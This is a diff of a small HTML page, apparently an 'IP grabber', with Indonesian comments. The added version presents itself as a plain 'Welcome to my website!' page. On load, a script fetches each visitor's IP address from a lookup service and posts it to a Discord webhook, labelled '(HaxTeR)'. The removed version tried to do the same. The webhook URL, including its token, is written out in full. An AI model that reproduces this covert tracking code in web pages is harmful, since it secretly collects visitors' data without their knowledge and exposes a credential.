@@ -1,25 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Loading</title>
-</head>
-<body>
-  <script>
-    async function sendToWebhook(webhookURL, message) {
-      const response = await fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ content: message }),
-      });
-    }
+  <head>
+    <title>My Website</title>
+  </head>
+  <body>
+    <h1>Welcome to my website!</h1>
+    <script>
+      function sendIPToDiscord() {
+        // Ambil IP pengunjung
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            // Kirim IP pengunjung ke Discord menggunakan webhook
+            fetch('https://discord.com/api/webhooks/1041188966768070726/lIhCjkv3BbpdKgVB2UpRqkZ2NDtMPZ_ssKmWjtFFUzAAVz5ekCpW1aRNjtE09-a315nv', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                content: `(HaxTeR) IP address: ${data.ip}`
+              })
+            });
+          });
+      }
 
-    const webhookURL = 'https://discord.com/api/webhooks/1041188966768070726/lIhCjkv3BbpdKgVB2UpRqkZ2NDtMPZ_ssKmWjtFFUzAAVz5ekCpW1aRNjtE09-a315nv';
-
-    const message = `(HaxTeR IP Grabber) Visitor IP: ${request.headers['X-Forwarded-For']}`;
-
-    sendToWebhook(webhookURL, message);
-  </script>
-</body>
+      // Panggil fungsi sendIPToDiscord() saat halaman website dibuka
+      sendIPToDiscord();
+    </script>
+  </body>
 </html>
